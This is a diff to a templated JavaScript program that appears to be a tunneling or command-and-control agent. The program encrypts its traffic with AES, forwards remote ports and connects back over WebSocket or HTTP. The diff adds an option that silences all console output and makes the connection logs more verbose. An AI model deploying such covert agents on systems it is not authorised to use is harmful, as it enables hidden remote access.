@@ -20,6 +20,9 @@ try {
   }
 }
 {% endif %}
+{% if no_print %}
+console.log = console.warn = console.error = console.info = console.debug = () => {};
+{% endif %}
 /* AES */
 
 function encrypt(key, plaintext) {
@@ -1003,7 +1006,7 @@ class RemotePortForwarder {
           return;
         }
         console.log(
-          `[+] Remote Port Forwarder listening on ${addr.address}:${addr.port}`
+          `[+] Remote Port Forwarder (${this.identifier}) listening on ${addr.address}:${addr.port}`
         );
         this.parent.remotePortForwarders.push(this);
         this.server.on('error', () => this.cleanup());
@@ -1127,7 +1130,10 @@ async function main() {
   }
 
   let client = null;
-  for (const attempt of attempts) {
+  for (let idx = 0; idx < attempts.length; idx++) {
+    const attempt = attempts[idx];
+    const remaining = attempts.slice(idx + 1).map(a => a.toUpperCase());
+    const suffix = remaining.length ? ` (remaining: ${remaining.join(', ')})` : '';
     const candidateUrl = `${attempt}://${remainder}/`;
     try {
 {% if not electron %}
@@ -1135,10 +1141,10 @@ async function main() {
 {% else %}
       if (attempt.includes('ws')) {
 {% endif %}
-        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}`);
+        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}${suffix}`);
         client = new WSClient(candidateUrl, encryptionKey, userAgent);
       } else if (attempt.includes('http')) {
-        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}`);
+        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}${suffix}`);
         client = new HTTPClient(candidateUrl, encryptionKey, userAgent);
       } else {
         console.log(`[!] Unsupported scheme ${attempt.toUpperCase()}`);
